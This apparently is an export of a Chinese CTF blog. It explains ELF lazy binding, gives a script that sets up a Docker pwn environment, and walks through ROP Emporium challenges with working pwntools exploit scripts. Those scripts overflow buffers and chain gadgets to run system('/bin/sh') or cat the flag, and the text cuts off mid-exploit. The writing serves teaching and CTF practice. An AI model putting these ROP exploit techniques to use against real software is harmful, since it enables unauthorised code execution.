0x8048554 0x00000019 (INIT_ARRAY) 0x8049f08 0x0000001b (INIT_ARRAYSZ) 4 (bytes) 0x0000001a (FINI_ARRAY) 0x8049f0c 0x0000001c (FINI_ARRAYSZ) 4 (bytes) 0x6ffffef5 (GNU_HASH) 0x80481ac 0x00000005 (STRTAB) 0x804823c 0x00000006 (SYMTAB) 0x80481cc 0x0000000a (STRSZ) 87 (bytes) 0x0000000b (SYMENT) 16 (bytes) 0x00000015 (DEBUG) 0x0 0x00000003 (PLTGOT) 0x804a000 0x00000002 (PLTRELSZ) 32 (bytes) 0x00000014 (PLTREL) REL 0x00000017 (JMPREL) 0x80482cc 0x00000011 (REL) 0x80482c4 0x00000012 (RELSZ) 8 (bytes) 0x00000013 (RELENT) 8 (bytes) 0x6ffffffe (VERNEED) 0x80482a4 0x6fffffff (VERNEEDNUM) 1 0x6ffffff0 (VERSYM) 0x8048294 0x00000000 (NULL) 0x0 这里主要关注以下东西： 1230x00000005 (STRTAB) 0x804823c0x00000006 (SYMTAB) 0x80481cc0x00000017 (JMPREL) 0x80482cc STRTAB ,SYMTAB ,JMPREL分别指向.dynstr，.dynsym，.rel.plt节段 动态符号表(.dynsym)用来保存与动态链接相关的导入导出符号，不包括模块内部的符号。而.symtab则保存所有符号，包括.dynsym中的符号，因此一般来说，.symtab的内容多一点 .dynsym是运行时所需的，ELF文件中 export/import 的符号信息全在这里，而.symtab节中存储的信息是编译时的符号信息，用strip工具会被删除，或者编译里加入-s参数也会删除。 我们主要关注动态符号.dynsym中的两个成员 st_name，该成员保存着动态符号在.dynstr表（动态字符串表）中的偏移 st_value，如果这个符号被导出，这个符号保存着对应的虚拟地址。 .rel.plt包含了需要重定位的函数信息，使用如下的结构 ，需要区别：.rel.plt节是用于函数重定位，rel.dyn节是用于变量重定位 1234567891011typedef struct &#123; Elf32_Addr r_offset; Elf32_Word r_info;&#125; Elf32_Rel;//32 位程序只使用 Elf32_Rel//64 位程序只使用 Elf32_Relatypedef struct &#123; Elf32_Addr r_offset; Elf32_Word r_info; Elf32_Sword r_addend;&#125; Elf32_Rela; r_offset: 指向对应got表的指针 r_info: r_info &gt;&gt; 8后得到一个下标，对应此导入符号在.dynsym中的下标 现在我们回到_dl_runtime_resolve(link_map, reloc_arg) 这里的link_map就是GOT[1]，reloc_arg就是函数在.rel.plt中的偏移，就是之前的push 8 我们继续 跟进_dl_runtime_resolve函数到call _dl_fixup，这个函数就是绑定真实地址到got的核心了 123456789101112131415_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg)&#123; // 首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset); // 然后通过reloc-&gt;r_info找到.dynsym中对应的条目 const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)]; // 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT=7 assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT); // 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址 result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL); // value为libc基址加上要解析函数的偏移地址，也即实际地址 value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : 0); // 最后把value写入相应的GOT表条目中 return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);&#125; 综上，整个过程是这样的 12345671、第一次执行函数，到plt表，接下去got表，由于没有真实地址，又返回plt表的第一项，压入reloc_arg和link_map后调用_dl_runtime_resolve(link_map,reloc_arg)2、link_map访问.dynamic节段，并获得.dynstr,.dynsym,.rel.plt节段地址3、.rel.plt + reloc_arg = 0,求出对应函数重定位表项Elf32_Rel的指针4、通过重定位表项Elf32_Rel的指针，得到对应函数的r_info，r_info &gt;&gt; 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针：5、利用Elf32_Sym的指针得到对应的st_name，.dynstr + st_name即为符号名字符串指针6、在动态链接库查找这个函数，并且把地址赋值给.rel.plt中对应条目的r_offset：指向对应got表的指针，由此puts的got表就被写上了真实的地址7、赋值给GOT表后，把程序流程返回给strlen]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn环境docker化]]></title>
    <url>%2F2020%2F06%2F21%2Fpwn%E7%8E%AF%E5%A2%83docker%E5%8C%96%2F</url>
    <content type="text"><![CDATA[拉取镜像123456789# docker pull ubuntu:18.0418.04: Pulling from library/ubuntu23884877105a: Pull complete bc38caa0f5b9: Pull complete 2910811b6c42: Pull complete 36505266dcc6: Pull complete Digest: sha256:3235326357dfb65f1781dbc4df3b834546d8bf914e82cce58e6e6b676e23ce8fStatus: Downloaded newer image for ubuntu:18.04docker.io/library/ubuntu:18.04 可以看到我们刚拉取的镜像 123# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEubuntu 18.04 c3c304cb4f22 3 weeks ago 64.2MB 然后启动镜像，这里–name参数起了个花名 12# docker run -i -t --name pwn_2.27 ubuntu:18.04 bashroot@e987b131fa26:/# 环境搭建一个新的docker环境里面是啥也没有的，连vim都没有，所以先update一下然后装一手vim，之后换源 12345678910111213# vim /etc/apt/sources.listggdG清空sources.list后改为阿里源deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse 保存后update一下 接下来安装相应的环境 这里直接拿了知世师傅的脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#!/bin/sh# auto install the pwn environment# @author:知世# @category:environment buildif [ `whoami` = "root" ];then dpkg --add-architecture i386 apt-get update -y apt-get install python -y apt-get install python-pip -y apt-get install gcc -y apt-get install gdb -y apt-get install git -y apt-get install wget -y apt-get install gem -y apt-get install ruby -y apt-get install tmux -y apt-get install libc6-dev-i386 -y apt-get install libc6-dbg -y apt-get install libc6-dbg:i386 -y apt-get install python-setuptools -y apt-get install make -y apt-get -y install netcat-traditional apt-get install ruby-dev -y gem install seccomp-tools //这里安装失败，需要ruby&gt;=2.4才能安装seccomp-tools gem install one_gadget pip install pwntools -i https://pypi.tuna.tsinghua.edu.cn/simple/ cd git clone https://github.com/nightRainy/pwndbg.git cd pwndbg ./setup.sh cd git clone https://github.com/inaz2/roputils.git cd git clone https://github.com/lieanu/LibcSearcher.git cd LibcSearcher python setup.py developelse sudo dpkg --add-architecture i386 sudo apt-get update -y sudo apt-get install python -y sudo apt-get install python-pip -y sudo apt-get install gcc -y sudo apt-get install gdb -y sudo apt-get install git -y sudo apt-get install wget -y sudo apt-get install gem -y sudo apt-get install ruby -y sudo apt-get install tmux -y sudo apt-get -y install netcat-traditional sudo apt-get install libc6-dev-i386 -y apt-get install libc6-dbg -y apt-get install libc6-dbg:i386 -y sudo apt-get install ruby-dev -y sudo apt-get install python-setuptools -y sudo apt-get install make -y sudo gem install seccomp-tools sudo gem install one_gadget pip install pwntools cd git clone https://github.com/nightRainy/pwndbg.git cd pwndbg ./setup.sh cd git clone https://github.com/inaz2/roputils.git cd git clone https://github.com/lieanu/LibcSearcher.git cd LibcSearcher python setup.py developfi 这里需要注意安装seccomp-tools时如果是ubuntu16的话，默认安装的ruby版本是2.23，但是安装seccomp-tools要求ruby版本2.4以上，所以这里需要先升级一下ruby 12345678apt-get install software-properties-common#添加PPA源：add-apt-repository ppa:brightbox/ruby-ngapt-get update#先删除旧版本：apt-get purge --auto-remove ruby#安装新版本apt-get install ruby2.6 ruby2.6-dev 设置tmux的鼠标切换 12~# touch .tmux.conf~# echo 'set -g mouse on' &gt; .tmux.conf 打包为镜像上传 首先docker ps -a查看我们docker 的实例号： 再打包为镜像 1docker commit -m "pwn 19.04 2.29" a403d2342bb4 r4bbit/dockerpwn:2.29 上传 1docker push r4bbit/dockerpwn:2.29 如果出现： 1denied: requested access to the resource is denied docker login登录一下就行了]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[pwn入门之ROP]]></title>
    <url>%2F2020%2F06%2F21%2Fpwn%E5%85%A5%E9%97%A8%E4%B9%8BROP%2F</url>
    <content type="text"><![CDATA[ret2winROP Emporium 放到IDA很容易就找到溢出点123char s; // [esp+0h] [ebp-28h] 可以看出s距ebp的偏移量为0x28所以我们写入0x28正好可以写到ebp之前，要覆盖ebp还需要再写入4个字节（32位） 有一点值得引起注意，我们回车换行符同样会输入进去，明确溢出点以及可溢出的字节后接下来我们就开始构造rop，但在之前我们还应该检查一下程序开户了哪些保护，这决定了我们该采取何种rop攻击方式 exp 如下 ：123456from pwn import *sh = process('./ret2win32')ret2win32 = 0x08048659payload = 'A' * 0x28 + p32(0) + p32(ret2win32)sh.sendline(payload)sh.interactive() 64位的溢出点也一样exp: 123456from pwn import *sh = process('./ret2win')ret2win = 0x400811payload = "A" * 0x20 + p64(0) + p64(ret2win)sh.sendline(payload)sh.interactive() split溢出点还是一样，不过少了可直接利用的函数，但是程序中提供了system函数和字符串”/bin/cat flag.txt”，同样ret到system并且通过栈传入”/bin/cat flag.txt”即可exp: 1234567from pwn import *sh = process('./split32')system = 0x08048657cat = 0x0804A030pyaload = 'A' * 0x28 + p32(0) + p32(system) + p32(cat)sh.sendline(pyaload)sh.interactive() 因为64位rdi是存储函数的第一个参数，所以我们需要pop rdi ;ret通过命令1ROPgadget --binary ./split --only &quot;pop|ret&quot; 找到gadget12345678910111213Gadgets information============================================================0x000000000040087c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040087e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400880 : pop r14 ; pop r15 ; ret0x0000000000400882 : pop r15 ; ret0x000000000040087b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040087f : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004006b0 : pop rbp ; ret0x0000000000400883 : pop rdi ; ret0x0000000000400881 : pop rsi ; pop r15 ; ret0x000000000040087d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004005b9 : ret 64位exp:12345678from pwn import *sh = process('./split')system = 0x4005E0cat_flag = 0x601060pop = 0x400883payload = "A" * 0x20 + p64(0) + p64(pop) + p64(cat_flag) + p64(system)sh.sendline(payload)sh.interactive() callme溢出点还是一样，不过现在程序 没有system函数，flag也不是直接cat flag.txt得到，而是通过callme_one,callme_two,callme_three三个函数的调用计算得到，我们看一下.so文件 这里要求传入的三个参数为1，2，3，接下来写exp这里需要注意，因为要连续调用3个函数，所以需要注意callme_one调用完了之后的返回地址不能再向前两道一样随便写p32(0)了，这里是为了保持栈的平衡，callme_one执行完之后 要把它的三个参数1,2,3弹出去，esp才能指向p32(callme_two)12345678910111213from pwn import *sh = process('./callme32')pop3_ret = 0x80488a9callme_one = 0x080485C0callme_two = 0x08048620callme_three = 0x080485B0payload = ""payload += "a" * 0x28 + p32(0)payload += p32(callme_one) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)payload += p32(callme_two) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)payload += p32(callme_three) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)sh.sendline(payload)sh.interactive() 12345678payload += p32(callme_one) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)其中的pop3_ret 是为了把 p32(1) + p32(2) + p32(3)弹出栈，最后一个ret指令相当于pop eip也就是把栈顶的内容传给eip，从而改变执行流程，在执行完三次pop后，esp已经指向p32(callme_two)，这样就可以接着去指向第二段rop从而顺利调用callme_two(1,2,3)poppoppopret地址可以用objdump找到 如果对此不太好理解的话，可以进入gdb一步步跟着调试，可以看清楚具体的流程 只有将1，2，3pop出去esp才能指向callme_two。 64位程序 ，就不需要栈平衡了，在64位下，前6个参数通过rdi,rsi,rdx,rcx,r8,r9传递，所以需要找到pop rdi;pop rsi ;pop rdx ret 的gadget可以用 objdump -d callme | grep -A 3 pop找到 也可以用ROPgadget –binary ./callme –only “pop|ret”12345678910111213141516Gadgets information============================================================0x0000000000401b1c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000401b1e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000401b20 : pop r14 ; pop r15 ; ret0x0000000000401b22 : pop r15 ; ret0x0000000000401b1b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000401b1f : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000401900 : pop rbp ; ret0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret0x0000000000401b23 : pop rdi ; ret0x0000000000401ab2 : pop rdx ; ret0x0000000000401b21 : pop rsi ; pop r15 ; ret0x0000000000401ab1 : pop rsi ; pop rdx ; ret0x0000000000401b1d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004017d9 : ret exp:123456789101112131415161718from pwn import *sh = process('./callme')callme_one = 0x401850callme_two = 0x401870callme_three = 0x401810# pop_rdi = 0x401b23# pop_rsi_rdx = 0x401ab1pop_rdi_rsi_rdx_ret = 0x401ab0payload = ""payload += 'a' * 0x20 + p64(0)# payload += p64(pop_rdi) + p64(1) + p64(pop_rsi_rdx) + p64(2) + p64(3) + p64(callme_one)# payload += p64(pop_rdi) + p64(1) + p64(pop_rsi_rdx) + p64(2) + p64(3) + p64(callme_two)# payload += p64(pop_rdi) + p64(1) + p64(pop_rsi_rdx) + p64(2) + p64(3) + p64(callme_three)payload += p64(pop_rdi_rsi_rdx_ret) + p64(1) + p64(2) + p64(3) + p64(callme_one)payload += p64(pop_rdi_rsi_rdx_ret) + p64(1) + p64(2) + p64(3) + p64(callme_two)payload += p64(pop_rdi_rsi_rdx_ret) + p64(1) + p64(2) + p64(3) + p64(callme_three)sh.sendline(payload)sh.interactive() write4write432： 同样的溢出点，但是这次没有/bin/sh，需要我们自己写到data中或者bss 中，两种写法没什么不同，就改个地址而已，这里就只说写到data段中，“/bin/sh”在32位中需要分两次写到 data 中去，用ROPgadget 查找可用的gadget 先： 123这里用到 0x08048670 : mov dword ptr [edi], ebp ; ret0x080486da : pop edi ; pop ebp ; ret exp :1234567891011121314151617181920212223242526# -*- coding:UTF-8 -*-from pwn import *sh = process('./write432')data_addr = 0x0804A028 #写入到 data 段# bss_addr = 0x0804A040 #写入到 bss 段system_ply = 0x08048430pop_edi_ebp = 0x080486damov_edi_ebp = 0x08048670payload = ""payload += 0x28 * "A" + p32(0)payload += p32(pop_edi_ebp)# payload += p32(bss_addr)payload += p32(data_addr)payload += "/bin"payload += p32(mov_edi_ebp)payload += p32(pop_edi_ebp)# payload += p32(bss_addr + 4)payload += p32(data_addr + 4)payload += "/sh\x00"payload += p32(mov_edi_ebp)payload += p32(system_ply)payload += p32(0)# payload += p32(bss_addr)payload += p32(data_addr)sh.sendline(payload)sh.interactive() write4:一样的思路，只不过在写入data的时候64位可以一次写入12345678910111213141516171819202122# -*- coding:UTF-8 -*-from pwn import *sh = process('./write4')# bss_addr = 0x0000000000601060 #写入到 bss 段data_addr = 0x0000000000601050 #写入到 data 段mov_r14_r15 = 0x0000000000400820pop_r14_r15 = 0x0000000000400890system_plt = 0x00000000004005E0pop_rdi = 0x0000000000400893payload = ""payload += 0x20 * "A" + p64(0)payload += p64(pop_r14_r15)payload += p64(data_addr)# payload += p64(bss_addr)payload += "/bin/sh\x00"payload += p64(mov_r14_r15)payload += p64(pop_rdi)# payload += p64(bss_addr)payload += p64(data_addr)payload += p64(system_plt)sh.sendline(payload)sh.interactive() badchars这次的程序对输入的字符进行了过滤,对于特定字符b,i,c/ &lt;空格&gt;,f,n.s，会被替换成-21，当然这会对我们成功写入”/bin/sh\x00”造成影响，所以我们要绕过这步替换12345678910111213141516171819202122232425 v3[0] = 'b'; v3[1] = 'i'; v3[2] = 'c'; v3[3] = '/'; v3[4] = ' '; v3[5] = 'f'; v3[6] = 'n'; v3[7] = 's'; j = 0LL; for ( i = 0LL; ; ++i ) &#123; result = i; if ( i &gt;= a2 ) break; for ( j = 0LL; j &lt;= 7; ++j ) &#123; if ( *(a1 + i) == v3[j] ) &#123; *(a1 + i) = -21; break; &#125; &#125; &#125; return result;&#125; 可以用xor将 “/bin/sh\x00”先进行加密，成功写入后再解密进行传参，先来找一下可以异或的数字：12345678910111213141516binsh = "/bin/sh\x00"badchar = [98, 105, 99, 47, 32, 102, 110, 115]# for i in badchar:# print chr(i)xornum = 1while 1: for x in binsh: tem = ord(x) ^ xornum if tem in badchar: xornum += 1 break if x == "\x00": print xornum xornum += 1 if xornum == 10: break 找到2，3，5，9，接下来查找一下gadget123456789101112131415161718192021$ ROPgadget --binary ./badchars32 --only &quot;mov|pop|ret|xor&quot;Gadgets information============================================================0x08048607 : mov al, byte ptr [0xc9010804] ; ret0x08048893 : mov dword ptr [edi], esi ; ret0x08048570 : mov ebx, dword ptr [esp] ; ret0x080488fb : pop ebp ; ret0x08048896 : pop ebx ; pop ecx ; ret0x080488f8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x08048461 : pop ebx ; ret0x08048897 : pop ecx ; ret0x080488fa : pop edi ; pop ebp ; ret0x0804889a : pop edi ; ret0x080488f9 : pop esi ; pop edi ; pop ebp ; ret0x08048899 : pop esi ; pop edi ; ret0x0804844a : ret0x0804885e : ret 0xd750x080485be : ret 0xeac10x08048890 : xor byte ptr [ebx], cl ; retUnique gadgets found: 16 因为32位程序一次只能传4个字符，所以需要分两次传exp:123456789101112131415161718192021222324252627282930313233343536# -*- coding:UTF-8 -*-from pwn import *sh = process('./badchars32')sysetm_plt = 0x080484E0binsh = "/bin/sh\x00"xorbinsh = ""#加密for i in binsh: xorbinsh += chr(ord(i) ^ 2)mov_edi_esi = 0x08048893pop_esi_edi = 0x08048899pop_ebx_ecx = 0x08048896xor_ebx_cl = 0x08048890bss_addr = 0x0804A044payload = ""payload += 0x28 * "A" + p32(0)#分两次传payload += p32(pop_esi_edi)payload += xorbinsh[0:4]payload += p32(bss_addr)payload += p32(mov_edi_esi)payload += p32(pop_esi_edi)payload += xorbinsh[4:8]payload += p32(bss_addr + 4)payload += p32(mov_edi_esi)#解密for x in range(0,len(xorbinsh)): payload += p32(pop_ebx_ecx) payload += p32(bss_addr + x) + p32(2) payload += p32(xor_ebx_cl)payload += p32(sysetm_plt) + p32(0) + p32(bss_addr)sh.sendline(payload)sh.interactive() 64位程序 ：一样的思路，先查一下gadget :1234567891011121314151617181920212223242526272829$ ROPgadget --binary ./badchars --only &quot;mov|pop|ret|xor&quot;Gadgets information============================================================0x0000000000400853 : mov byte ptr [rip + 0x20084e], 1 ; ret0x0000000000400b35 : mov dword ptr [rbp], esp ; ret0x00000000004008ee : mov eax, 0 ; pop rbp ; ret0x0000000000400a3b : mov eax, dword ptr [rbp - 8] ; pop rbp ; ret0x0000000000400b34 : mov qword ptr [r13], r12 ; ret0x0000000000400a3a : mov rax, qword ptr [rbp - 8] ; pop rbp ; ret0x0000000000400bac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400b3b : pop r12 ; pop r13 ; ret0x0000000000400bae : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400b3d : pop r13 ; ret0x0000000000400b40 : pop r14 ; pop r15 ; ret0x0000000000400b42 : pop r15 ; ret0x0000000000400852 : pop rbp ; mov byte ptr [rip + 0x20084e], 1 ; ret0x0000000000400bab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400baf : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004007f0 : pop rbp ; ret0x0000000000400b39 : pop rdi ; ret0x0000000000400b41 : pop rsi ; pop r15 ; ret0x0000000000400bad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400b3c : pop rsp ; pop r13 ; ret0x00000000004006b1 : ret0x0000000000400aad : ret 0x10750x0000000000400b30 : xor byte ptr [r15], r14b ; ret0x0000000000400b31 : xor byte ptr [rdi], dh ; retUnique gadgets found: 24 64位程序就可以一次传进去exp:12345678910111213141516171819202122232425262728293031# -*- coding:UTF-8 -*-from pwn import *sh = process('./badchars')binsh = "/bin/sh\x00"xorbinsh = ""#加密for i in binsh: xorbinsh += chr(ord(i) ^ 2)bss_addr = 0x0000000000601080system_plt = 0x00000000004006F0mov_r13_r12_ret = 0x0000000000400b34pop_r12_r13_ret = 0x0000000000400b3bxor_r15_r14_ret = 0x0000000000400b30pop_r14_r15_ret = 0x0000000000400b40pop_rdi_ret = 0x0000000000400b39payload = ""payload += 0x28 * "A"#一次传入payload += p64(pop_r12_r13_ret)payload += xorbinshpayload += p64(bss_addr)payload += p64(mov_r13_r12_ret)#解密 for i in range(0,len(xorbinsh)): payload += p64(pop_r14_r15_ret) payload += p64(2) + p64(bss_addr + i) payload += p64(xor_r15_r14_ret)payload += p64(pop_rdi_ret) + p64(bss_addr) + p64(system_plt)sh.sendline(payload)sh.interactive() fluff题目的设置跟前面的题还是一样没什么变化，查一波gadget，会发现在这次的写入没之前的那么顺利12345678910111213141516171819202122232425262728293031$ ROPgadget --binary ./fluff32 --only &quot;mov|pop|ret|xor|xchg&quot;Gadgets information============================================================0x08048547 : mov al, byte ptr [0xc9010804] ; ret0x08048709 : mov dword ptr [0x81fffffd], eax ; ret0x08048693 : mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret0x08048674 : mov ebp, 0xcafebabe ; ret0x080484b0 : mov ebx, dword ptr [esp] ; ret0x0804867e : mov edi, 0xdeadbabe ; ret0x0804868c : mov edx, 0xdefaced0 ; ret0x0804867d : pop ebp ; mov edi, 0xdeadbabe ; ret0x0804868b : pop ebp ; mov edx, 0xdefaced0 ; ret0x08048695 : pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret0x080486fb : pop ebp ; ret0x080486f8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x080483e1 : pop ebx ; ret0x08048696 : pop ebx ; xor byte ptr [ecx], bl ; ret0x08048692 : pop edi ; mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret0x080486fa : pop edi ; pop ebp ; ret0x08048670 : pop edi ; xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret0x08048673 : pop esi ; mov ebp, 0xcafebabe ; ret0x080486f9 : pop esi ; pop edi ; pop ebp ; ret0x0804867a : pop esi ; xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret0x080483ca : ret0x080484fe : ret 0xeac10x08048689 : xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret0x08048697 : xor byte ptr [ecx], bl ; ret0x0804867b : xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret0x08048671 : xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; retUnique gadgets found: 26 因为没有mov可以直接写入，这里我们可以用xor进行写入操作，用一个xor操作清空寄存器A，再通过 xor A,B就可以将B寄存器的内容写入到寄存器A中去。这道题就是巧秒得利用了xor来进行写入。exp:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# -*- coding:UTF-8 -*-from pwn import *context.log_level = "debug"sh = process('./fluff32')binsh = "/bin/sh\x00"system_plt = 0x08048430data_addr = 0x0804A028#mov_ecx_edx;pop_ebp;pop_ebx;xor_ecx_bl;retgadget1 = 0x08048693#xor_edx_edx;pop_esi;mov_ebp_0xcafebabe;ret 亦或自身gadget2 = 0x08048671#xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; retgadget3 = 0x0804867bpop_ebx = 0x080483e1#xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; retgadget4 = 0x08048689junk = "A" * 4payload = ""payload += 0x28 * "A" + junkpayload += p32(gadget2) + p32(0) #xor_edx_edx (edx = 0)payload += p32(pop_ebx) + p32(data_addr)payload += p32(gadget3) + p32(0) #(edx = data_addr,pop_ebp,mov)payload += p32(gadget4) + p32(0) #ecx = data_addrpayload += p32(pop_ebx) payload += "/bin"payload += p32(gadget2) + p32(0) #xor_edx_edx (edx = 0)payload += p32(gadget3) + p32(0) #(edx = "/bin",pop_ebp,mov)#"/bin"放到data中去payload += p32(gadget1) + p32(0) + p32(0)payload += p32(pop_ebx) + p32(data_addr + 4)payload += p32(gadget2) + p32(0) #xor_edx_edx (edx = 0)payload += p32(gadget3) + p32(0) #(edx = data_addr,pop_ebp,mov)payload += p32(gadget4) + p32(0) #ecx = data_addr + 4payload += p32(pop_ebx) payload += "/sh\x00"payload += p32(gadget2) + p32(0) #xor_edx_edx (edx = 0)payload += p32(gadget3) + p32(0) #(edx = "/bin",pop_ebp,mov)#"xsh\x00"放到data中去payload += p32(gadget1) + p32(0) + p32(0)payload += p32(system_plt) + p32(0) + p32(data_addr)sh.sendline(payload)sh.interactive() 64位程序 ：这里需要注意一下在查gadget的时候，可能会出现找不到想要的gadget，可以加上参数 –depth 20，（20是深度最深的情况了）12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152$ ROPgadget --binary fluff --only &quot;mov|pop|ret|xor|xchg&quot; --depth 20Gadgets information============================================================0x0000000000400713 : mov byte ptr [rip + 0x20096e], 1 ; ret0x000000000040084f : mov dword ptr [rdx], ebx ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret0x00000000004007ae : mov eax, 0 ; pop rbp ; ret0x0000000000400835 : mov ebp, 0x604060 ; ret0x0000000000400846 : mov ebx, 0x602050 ; ret0x0000000000400827 : mov edi, 0x601050 ; ret0x000000000040083b : mov edi, 0x601050 ; xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret0x000000000040084e : mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret0x0000000000400845 : mov r11d, 0x602050 ; ret0x0000000000400834 : mov r13d, 0x604060 ; ret0x0000000000400832 : pop r12 ; mov r13d, 0x604060 ; ret0x00000000004008bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400853 : pop r12 ; xor byte ptr [r10], r12b ; ret0x0000000000400851 : pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret0x00000000004008be : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400825 : pop r14 ; mov edi, 0x601050 ; ret0x00000000004008c0 : pop r14 ; pop r15 ; ret0x000000000040082d : pop r14 ; xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret0x000000000040084c : pop r15 ; mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret0x0000000000400843 : pop r15 ; mov r11d, 0x602050 ; ret0x00000000004008c2 : pop r15 ; ret0x0000000000400820 : pop r15 ; xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret0x0000000000400712 : pop rbp ; mov byte ptr [rip + 0x20096e], 1 ; ret0x00000000004008bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400852 : pop rbp ; pop r12 ; xor byte ptr [r10], r12b ; ret0x00000000004008bf : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004006b0 : pop rbp ; ret0x00000000004008ba : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040084d : pop rdi ; mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret0x0000000000400844 : pop rdi ; mov r11d, 0x602050 ; ret0x00000000004008c3 : pop rdi ; ret0x0000000000400821 : pop rdi ; xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret0x0000000000400826 : pop rsi ; mov edi, 0x601050 ; ret0x00000000004008c1 : pop rsi ; pop r15 ; ret0x000000000040082e : pop rsi ; xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret0x0000000000400833 : pop rsp ; mov r13d, 0x604060 ; ret0x00000000004008bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400854 : pop rsp ; xor byte ptr [r10], r12b ; ret0x00000000004005b9 : ret0x0000000000400841 : xchg ebx, edx ; pop r15 ; mov r11d, 0x602050 ; ret0x0000000000400840 : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret0x0000000000400855 : xor byte ptr [r10], r12b ; ret0x0000000000400856 : xor byte ptr [rdx], ah ; ret0x0000000000400823 : xor ebx, ebx ; pop r14 ; mov edi, 0x601050 ; ret0x0000000000400830 : xor ebx, esp ; pop r12 ; mov r13d, 0x604060 ; ret0x0000000000400822 : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret0x000000000040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; retUnique gadgets found: 47 exp:1234567891011121314151617181920212223242526272829303132333435363738from pwn import *sh = process('./fluff')binsh = "/bin/sh\x00"system_plt = 0x00000000004005E0data_addr = 0x0000000000601050pop_rdi = 0x00000000004008c3#mov r10, r11 ; pop r13 ; pop r12 ; xor r10, r12 ; 